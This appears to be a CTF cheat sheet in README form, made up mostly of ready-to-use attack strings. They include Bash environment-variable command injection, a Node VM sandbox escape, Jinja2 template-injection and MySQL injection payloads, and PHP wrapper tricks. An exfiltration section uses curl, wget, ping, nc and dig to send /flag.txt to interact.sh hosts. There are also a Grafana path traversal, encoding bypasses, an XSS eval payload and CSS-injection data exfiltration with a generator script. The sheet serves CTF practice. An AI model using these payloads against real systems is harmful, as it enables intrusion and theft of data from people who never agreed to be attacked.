# magic_strings
Handy bits for CTFs and life

### Bash 

#### ENV Vars
    BASH_ENV='$(id 1>&2)' bash -c 'echo hello'

    env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'

#### Encoding

    $'\151\144'

### NodeJS

#### Node VM

Escape Node VM Sandbox

    this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()

### Python

#### Jinja2 / Template Injection

    
    {{request.application.__globals__.__builtins__.__import__('os').popen(request.args.get('p','id')).read()}}
    {{config.__class__.__init__.__globals__['os'].environ}}

### MySQL 

MySQL >=5.6

    concat(0x404f73616e64614d616c6974680a, @@innodb_version ,0x0a,user(),0x0a, schema(), (select (@x) from (select (@x:=0x00), (@number:=0),(select (0) from (mysql.innodb_table_stats) where (@x:=concat(@x,0x0a,lpad(@number:=@number+1,2,0),0x2e20,database_name, 0x202d3e20 ,table_name,0x202d3e20 ,length(table_name)))))x))

### PHP

    data://data:text/plain,<?php system("id")?>
    
    php://filter/convert.base64-encode/resource=index.php

### Exfiltrate

    curl -T /flag.txt xxxx.interct.sh
    wget --post-file /flag.txt xxxx.interct.sh
    wget -U `cat /flag.txt` xxxx.interct.sh
    wget `base64 -w0 /flag.txt`.xxxx.interct.sh
    ping here.xxx.interact.sh
    ping $(head -c 32 /flag|base64|tr -d "="|tr "+" "-"|tr "/" ".").xxx.interact.sh
    nc nchere.xxx.interact.sh 80
    dig dighere.xxx.interact.sh
    git clone githere.xxx.interact.sh

### Path Traversal

    curl --path-as-is grafana.example.com/public/plugins/alertmanager/../../../../../../../../tmp/flag

### Bypass

#### utf8 normalization

      " 	%C0%A2 	%E0%80%A2 	%F0%80%80%A2 	Double quote 	
      ' 	%C0%A7 	%E0%80%A7 	%F0%80%80%A7 	Single quote 	
      < 	%C0%BC 	%E0%80%BC 	%F0%80%80%BC 	Less-than sign 	
      > 	%C0%BE 	%E0%80%BE 	%F0%80%80%BE 	Greater-than sign 	
      . 	%c0%2e %C0%AE 	%E0%80%AE 	%F0%80%80%AE 	Full stop 	
      / 	%c0%2f %C0%AF 	%E0%80%AF 	%F0%80%80%AF 	Solidus 	
      \ 	%c0%5c %C1%9C %c0%80%5c %E0%81%9C 	%F0%80%81%9C 	Reverse solidus

### XSS

Limited charset

```
< ="<img src data-x=YWxlcnQoZG9jdW1lbnQubG9jYXRpb24p onerror=javascript:eval(atob(this.dataset.x)) />
```

#### CSS Injection

Abuse unicode range to exfiltrate charset

```css
@font-face {
    font-family:poc;
    src:url('//colab.com/A');
    unicode-range:U+0041;
}
@font-face {
    font-family:poc;
    src:url('//colab.com/B');
    unicode-range:U+0042;
}
#secret {
    font-family:poc;
}
...
```
Generator

```python
import string
colab = "xxx.interact.sh"
select = "h1"
for l in string.ascii_letters:
  print("@font-face{font-family:poc;src:url('//"+l+"."+colab+"/"+l+"');unicode-range:U+00"+ hex(ord(l))[2:]+";}",end="")
print(select+"{font-family:poc;}")
```

Attribute selectors

Contains: 

```css
a[href*="flag{"] {
  ...
}
```

Starts with:

```css
[class^="flag{A"] {
  background:url('//colab.com/A');
}
[class^="flag{B"] {
  background:url('//colab.com/B');
}
```


## Resources

- [Payloads All The Things]( https://github.com/swisskyrepo/PayloadsAllTheThings/ )
- [Reverse Shells Generator]( https://www.revshells.com/ )
- [IP Format Converter (Bypass)](https://h.43z.one/ipconverter/)
- [Photo Osint Resources](https://start.me/p/0PgzqO/photo-osint)

### De/Compile De/Obfuscate

- [JS Deobfuscator]( https://www.seosniffer.com/javascript-deobfuscator )
- [De Obfuscate JS]( https://lelinhtinh.github.io/de4js/ )
- [Compile Online]( https://rextester.com/ )
- [Decompile Java]( http://www.javadecompilers.com/ )

### Encode/Decode/Crypto

- [codext]( https://github.com/dhondta/python-codext ) [Guess mode]( https://python-codext.readthedocs.io/en/latest/guessing.html )

### Cheatsheets

- [Web CTF Cheatsheet]( https://github.com/sl4x0/Web-CTF-Cheatsheet )
- [XSS Cheat sheet]( https://portswigger.net/web-security/cross-site-scripting/cheat-sheet )
- [HackTricks]( https://book.hacktricks.xyz )
- [💣 PHP Web CTF Cheatsheet](https://github.com/w181496/web-ctf-cheatsheet)
- [XS Leaks]( https://xsleaks.dev/docs/attacks/css-tricks/ )

#### Pentest - Network

- [OSCP](https://trojand.com/cheatsheet/)
- [Photo Osint](https://start.me/p/0PgzqO/photo-osint)
- [Offensive Security](https://cheatsheet.haax.fr) 

